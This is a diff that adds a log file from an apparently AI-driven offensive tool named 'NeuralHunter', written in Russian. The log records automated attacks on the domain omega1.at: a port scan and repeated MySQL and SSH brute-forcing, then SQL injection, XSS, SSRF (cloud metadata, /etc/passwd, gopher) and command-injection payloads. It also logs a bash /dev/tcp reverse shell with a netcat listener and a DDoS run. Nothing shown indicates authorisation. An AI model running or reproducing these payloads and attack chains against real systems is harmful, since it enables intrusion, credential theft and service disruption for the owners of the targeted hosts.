@@ -1,0 +1,110 @@
+2025-11-04 15:10:52,672 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ЛОГЕР v10.1 АКТИВИРОВАН[/bold magenta]
+2025-11-04 15:10:53,003 - NeuralHunter - INFO - ЦЕПОЧКА: HUNTER → http://omega1.at/FUZZ
+2025-11-04 15:10:53,004 - NeuralHunter - INFO - ULTIMATE TOKEN HUNTER → http://omega1.at/FUZZ
+2025-11-04 15:10:53,577 - NeuralHunter - INFO - [GET] http://omega1.at/ → 200
+2025-11-04 15:10:53,579 - NeuralHunter - INFO - ЦЕПОЧКА: PORT_SCAN → http://omega1.at/FUZZ
+2025-11-04 15:10:53,580 - NeuralHunter - INFO - PORT SCAN → http://omega1.at/FUZZ
+2025-11-04 15:10:53,640 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 21
+2025-11-04 15:10:53,643 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 22
+2025-11-04 15:10:53,646 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 80
+2025-11-04 15:10:53,650 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 443
+2025-11-04 15:10:53,653 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8080
+2025-11-04 15:10:53,656 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8443
+2025-11-04 15:10:53,660 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 3306
+2025-11-04 15:10:53,663 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 5432
+2025-11-04 15:10:53,668 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:10:53,669 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
+2025-11-04 15:11:06,705 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:11:06,707 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
+2025-11-04 15:11:36,855 - NeuralHunter - INFO - ЦЕПОЧКА: SQL → http://omega1.at/FUZZ
+2025-11-04 15:11:36,857 - NeuralHunter - INFO - SQL INJECTION → http://omega1.at/FUZZ
+2025-11-04 15:11:37,155 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=1 → 200
+2025-11-04 15:11:37,157 - NeuralHunter - INFO - ОТВЕТ: 200 (437 bytes)
+2025-11-04 15:11:37,158 - NeuralHunter - ERROR - JSON ошибка: Expecting value: line 1 column 3 (char 2)
+2025-11-04 15:11:37,160 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:11:37,161 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
+2025-11-04 15:11:50,206 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:11:50,208 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
+2025-11-04 15:12:20,660 - NeuralHunter - INFO - ЦЕПОЧКА: XSS → http://omega1.at/FUZZ
+2025-11-04 15:12:20,661 - NeuralHunter - INFO - XSS АТАКА → http://omega1.at/FUZZ
+2025-11-04 15:12:20,663 - NeuralHunter - INFO - XSS ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E
+2025-11-04 15:12:21,174 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E → 403
+2025-11-04 15:12:21,178 - NeuralHunter - INFO - XSS ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+2025-11-04 15:12:21,507 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E → 200
+2025-11-04 15:12:21,509 - NeuralHunter - INFO - XSS ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29
+2025-11-04 15:12:21,791 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29 → 200
+2025-11-04 15:12:21,793 - NeuralHunter - INFO - XSS ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E
+2025-11-04 15:12:22,076 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E → 200
+2025-11-04 15:12:22,078 - NeuralHunter - INFO - XSS ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E
+2025-11-04 15:12:22,537 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E → 403
+2025-11-04 15:12:22,540 - NeuralHunter - INFO - XSS ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E
+2025-11-04 15:12:22,979 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E → 403
+2025-11-04 15:12:22,983 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:12:22,984 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
+2025-11-04 15:12:36,052 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:12:36,053 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
+2025-11-04 15:13:06,329 - NeuralHunter - INFO - ЦЕПОЧКА: CSRF → http://omega1.at/FUZZ
+2025-11-04 15:13:06,330 - NeuralHunter - INFO - CSRF АТАКА → http://omega1.at/FUZZ
+2025-11-04 15:13:06,620 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ → 200
+2025-11-04 15:13:06,622 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:13:06,623 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
+2025-11-04 15:13:19,618 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:13:19,620 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
+2025-11-04 15:13:49,862 - NeuralHunter - INFO - ЦЕПОЧКА: SSRF → http://omega1.at/FUZZ
+2025-11-04 15:13:49,863 - NeuralHunter - INFO - SSRF АТАКА → http://omega1.at/FUZZ
+2025-11-04 15:13:49,864 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/
+2025-11-04 15:13:50,169 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/ → 200
+2025-11-04 15:13:50,170 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22
+2025-11-04 15:13:50,457 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22 → 200
+2025-11-04 15:13:50,458 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd
+2025-11-04 15:13:50,996 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd → 403
+2025-11-04 15:13:50,998 - NeuralHunter - WARNING - SSRF ЗАБЛОКИРОВАН: 403 на file:///etc/passwd
+2025-11-04 15:13:50,999 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=file%3A///proc/version
+2025-11-04 15:13:51,283 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///proc/version → 200
+2025-11-04 15:13:51,284 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e
+2025-11-04 15:13:51,561 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e → 200
+2025-11-04 15:13:51,563 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:13:51,564 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
+2025-11-04 15:14:04,630 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:14:04,632 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
+2025-11-04 15:14:34,785 - NeuralHunter - INFO - ЦЕПОЧКА: RCE → http://omega1.at/FUZZ
+2025-11-04 15:14:34,786 - NeuralHunter - INFO - RCE АТАКА → http://omega1.at/FUZZ
+2025-11-04 15:14:34,788 - NeuralHunter - INFO - RCE ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=%3Bid
+2025-11-04 15:14:35,057 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bid → 200
+2025-11-04 15:14:35,059 - NeuralHunter - INFO - RCE ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=%7Cwhoami
+2025-11-04 15:14:35,348 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%7Cwhoami → 200
+2025-11-04 15:14:35,350 - NeuralHunter - INFO - RCE ПЕЙЛОД:
+                             http://omega1.at/FUZZ?FUZZ=%24%28id%29
+2025-11-04 15:14:35,839 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%24%28id%29 → 403
+2025-11-04 15:14:35,842 - NeuralHunter - INFO - RCE НАЙДЕН: $(id)
+2025-11-04 15:14:35,846 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:14:35,848 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
+2025-11-04 15:14:48,912 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:14:48,913 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
+2025-11-04 15:15:19,073 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:15:19,074 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
+2025-11-04 15:15:19,075 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
+2025-11-04 15:15:19,590 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
+2025-11-04 15:15:19,594 - NeuralHunter - INFO - ЦЕПОЧКА: DDOS → http://omega1.at/FUZZ
+2025-11-04 15:15:19,595 - NeuralHunter - WARNING - SMART DDOS: 200 запросов → http://omega1.at/FUZZ (ТОЛЬКО НА СВОЙ СЕРВЕР!)
+2025-11-04 15:16:25,723 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:16:25,724 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
+2025-11-04 15:16:38,776 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:16:38,777 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
+2025-11-04 15:17:09,053 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL → http://omega1.at/FUZZ[/bold cyan]
+2025-11-04 15:17:09,055 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
+2025-11-04 15:17:09,056 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
+2025-11-04 15:17:09,793 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
